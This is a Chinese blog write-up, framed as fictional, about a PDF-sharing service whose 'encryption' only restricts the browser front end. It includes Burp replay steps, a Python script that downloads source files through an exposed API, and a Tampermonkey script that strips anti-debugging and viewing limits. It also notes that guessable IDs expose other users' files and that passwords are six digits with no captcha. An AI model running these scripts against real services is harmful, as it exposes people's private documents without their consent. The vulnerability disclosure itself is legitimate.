---
title: "【赛博保安】某些 PDF 加密分享平台获取源文件"
published: 2025-02-23
description: "本文章没有针对任何厂商和平台, 我只是平等地看不起所有把开源代码修改几下, 自以为是地加个所谓的\"加密\", 就敢把产品拿出来祸害用户的垃圾厂商.  本文章的所有内容纯属虚构, 如有雷同纯属巧合."
image: "https://s2.loli.net/2025/02/23/pVXPsuaOZ4627yJ.png"
tags: [Web安全]
category: "赛博保安"
draft: false
---

> 本文章没有针对任何厂商和平台, 我只是平等地看不起所有把开源代码修改几下, 自以为是地加个所谓的"加密", 就敢把产品拿出来祸害用户的垃圾厂商.
>
> 本文章的所有内容纯属虚构, 如有雷同纯属巧合.
> 

# 0 写在前面

本文中以虚构的笔X分享为例, 介绍一种通过 HTTP 流量抓包/重放实现的简单的获取声称"被加密"的 PDF 源文件的方法.

首先来细数这类分享平台的罪恶:

* 滥用开源代码, 不遵守开源协议. 不仅代码闭源, 甚至在不标注代码来源的情况下修改代码后商用.
* 以文件"加密"平台自居, 实际上并未对文件进行任何意义上的加密, 仅使用开源的前端 JS 代码对 web 端页面权限进行限制. 文件传输\读取过程暴露在完全未加密的状态下, 属于是害人来的.
* 文件水印功能实际上只显示在前端, 并未对文件进行加水印操作, 属于是想省钱想疯了.


<!-- more -->

# 1 工具准备

* 任意抓包工具, 只要能抓 HTTP 流量就行

本文以 Burp Suite Community 为例.

# 2 XX, 启动!

启动 Burp, 在 Proxy 页上开启拦截.

在 Burp 内置的谷歌浏览器中访问得到的分享链接.

如果你使用的是 2025 年之后版本的 Burp 的话, 会看到 Burp 将页面的所有 web 请求都整齐地列了出来, 这点比老版本的 Burp 会舒服很多. 而且还可以多选 Forward/Drop.

作为例子的这个网站接入了腾讯的统计系统, 会频繁向 `otheve.beacon.qq.com` 发送请求. 并且每隔 1s 就会发起一次 heartbeat 请求. 比较烦人, 可以右键停止拦截到这些目录的请求.

放一些包, 直到看到一个明摆着加载了文件的包时:

好家伙, 文件直接存到 CDN 里面, 访问的时候前端限制一下, 然后 CDN 里面直接丢源文件过来. 

把这个请求传到 Repeater 里面. 

![](https://s2.loli.net/2025/02/23/uFcAw5JyrePLbjW.png)

就拿到了源文件.

Response 栏上面三条杠, 保存到文件, 再用二进制编辑器把文件内容之外的 HTTP 响应体删掉. 如果你的 PDF 阅读器够现代化, 可以自动识别到文件头的位置, 甚至可以直接打开.

# 3 所以... 问题出在哪里

首先大概梳理以下这个网站的"加密"逻辑:

## 用户上传文件

存储至 CDN 并为文件生成一个 ID (疑似为 Base64 编码后的数字字符串)-> (猜测)将文件在 CDN 中的存储位置与随机生成的文件 ID 存储至数据库

这里就已经出现了比较严重的问题了.

![](https://s2.loli.net/2025/02/23/QTDxnS2gyE9kLir.png)

可以看到, 当文件上传时, 会跳转至 `/#/pdf/result/<digital id>` 页面, 会将访问文件时使用的链接(`https://pdfxx.cn/api/pdf/pdf?id=MTIyxxxx`)显示出来. 神奇的事情发生了, 链接中的 `id` 参数在 base64 解码之后正是 url 中的\<digital id\>. 因此猜测存在 id 爆破问题. 尝试访问几个其他的文件:

![](https://s2.loli.net/2025/02/23/cnhUPR6FSumOBlt.png)

确实和猜测的一样. 多试了几个, 没有加密的文件是可以直接访问的:

![](https://s2.loli.net/2025/02/23/fl8zO632jeEyuXw.png)

访问文件时会从 CDN 上获取对应的文件

![](https://s2.loli.net/2025/02/23/phzO7BcFDsZ1Mkx.png)

## 用户访问文件

根据用户访问的 id 查询文件在 CDN 上的路径 -> 用 pdfjs 加载 CDN 上的 pdf 文件.

也就是说, 全程实际上没有涉及到加密传输之类的技术, 仅在前端对按键\开发者工具等进行了限制.

在看 js 代码时, 发现了一个接口:

![](https://s2.loli.net/2025/02/23/DbGQAXwuerIMsvJ.png)

联系上下文, 应该是获取 pdf 文件在 CDN 中存储地址的接口, 浅试一下:

![](https://s2.loli.net/2025/02/23/vgTlb8dDM76FBka.png)

至此已经可以在获得文件分享地址的情况下提取到 pdf 源文件了.

```python
import requests
from base64 import b64decode

host = "pdfxx.cn"
id = "xxxxxx"
url_api = f"https://{host}/api/pdf/uurl?id={id}"

headers = {
    "Host": host,
    "Sec-Ch-Ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Origin": f"https://{host}",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": f"https://{host}/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Priority": "u=1, i",
    "Connection": "keep-alive"
}

api_cdn = requests.get(url_api, headers=headers, timeout=10)
url_cdn = b64decode(api_cdn.json.get("data").encode())

response = requests.get(url_cdn, headers=headers, timeout=100)
response.raise_for_status()

with open(f"{url_cdn.split('/')[-1]}", "wb") as f:
    f.write(response.content)

```

## 用户浏览器加载 pdf 文件

前端 js 对用户行为进行限制, 包括:

* 监听并劫持键盘事件
* 定时发送 HeartBeat, 以实现限制单次访问时长的功能
* 检测到 Debugger 之后跳转到 ConsoleBan 页面
* 鼠标焦点离开页面后显示遮罩层

祭出我的 Tamper Monkey 脚本, 稍作适配:

```js
// ==UserScript==
// @name         PDFXX Unlocker
// @namespace    http://noahbox.github.io
// @version      0.1
// @description  解除PDFXX的控制台检测/右键限制/遮罩层
// @author       NoahTie
// @match        *://pdfxx.cn/*
// @run-at       document-start
// @grant        unsafeWindow
// @grant        GM_addStyle
// @license      MIT
// ==/UserScript==

(function() {
    'use strict';

    // 禁用ConsoleBan
    // ========================================
    unsafeWindow.ConsoleBan = class {
        constructor() {
            console.log("[Bypass] ConsoleBan constructor neutralized");
        }
        init() {}
        ban() {}
        fire() {
            console.warn("[Bypass] Blocked redirect attempt");
            return false;
        }
    };
    Object.defineProperty(unsafeWindow, 'ConsoleBan', {
        configurable: false,
        writable: false
    });

    // 事件系统劫持
    // ========================================
    const nativeAddEventListener = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, listener, options) {
        const blockedEvents = [
            'contextmenu', 'selectstart',       // 右键/选择限制
            'visibilitychange', 'blur',         // 标签页切换检测
            'mouseleave', 'mouseout'            // 鼠标离开检测
        ];
        if (blockedEvents.includes(type)) {
            console.log(`[Bypass] Blocked ${type} event binding`);
            return;
        }
        nativeAddEventListener.call(this, type, listener, options);
    };

    // 动态遮罩层清除
    // ========================================
    GM_addStyle(`
        #mask-layer, .anti-shade, [class*="mask"] {
            display: none !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }
        body > div:not(#viewerContainer) {
            filter: none !important;
        }
    `);

    const observer = new MutationObserver(mutations => {
        mutations.forEach(mutation => {
            mutation.addedNodes.forEach(node => {
                if (node.nodeType === 1 && (
                    node.id.includes('mask') ||
                    node.className.match(/shade|modal|overlay/)
                )) {
                    node.remove();
                    console.log("[Bypass] Removed dynamic mask layer");
                }
            });
        });
    });
    observer.observe(document.body, {
        childList: true,
        subtree: true
    });

    // 定时器清理
    // ========================================
    const timerStore = new Set();
    const hijackedSetInterval = window.setInterval;
    window.setInterval = (fn, delay) => {
        const id = hijackedSetInterval(() => {
            try {
                if(!fn.toString().includes('debugger')) fn();
            } catch(e) { console.error(e); }
        }, delay);
        timerStore.add(id);
        return id;
    };

    setInterval(() => {
        timerStore.forEach(id => {
            clearInterval(id);
            clearTimeout(id);
        });
        timerStore.clear();
    }, 1000);

    // 网络请求拦截
    // ========================================
    const nativeFetch = window.fetch;
    window.fetch = (url, options) => {
        if (/consoleBan|lunxun/.test(url)) {
            console.log(`[Bypass] Blocked request to ${url}`);
            return Promise.reject(new Error('Blocked by script'));
        }
        return nativeFetch(url, options);
    };

    XMLHttpRequest.prototype.open = function(method, url) {
        if (/consoleBan|lunxun/.test(url)) {
            this._blocked = true;
            console.log(`[Bypass] Blocked XHR to ${url}`);
        }
        nativeOpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(data) {
        if (this._blocked) return;
        nativeSend.call(this, data);
    };

    // 右键恢复
    // ========================================
    document.addEventListener('DOMContentLoaded', () => {
        document.body.oncontextmenu = null;
        document.querySelectorAll('*').forEach(el => {
            el.oncontextmenu = null;
            el.style.pointerEvents = 'auto';
        });
    });

    // 反反调试
    // ========================================
    Object.defineProperty(unsafeWindow, 'console', {
        value: console,
        writable: false,
        configurable: false
    });
    Object.defineProperty(unsafeWindow.console, 'log', {
        value: console.log,
        writable: false
    });
})();

```

至此, 除了需要密码访问和需要微信鉴权的文件之外, 已经完全结束了.

# 4 And more ... ?

在尝试了密码加密和微信鉴权之后, 我发现了一些有趣的东西.

不过这些不打算写出来. 毕竟已经涉及到用户隐私了.

还是做一个提醒, 不要相信这些加密和微信鉴权.

另外, 这个平台的文件访问密码**一定是** 6 位纯数字的, 没有任何 captcha 机制, api 接口暴露且没有来源检测.
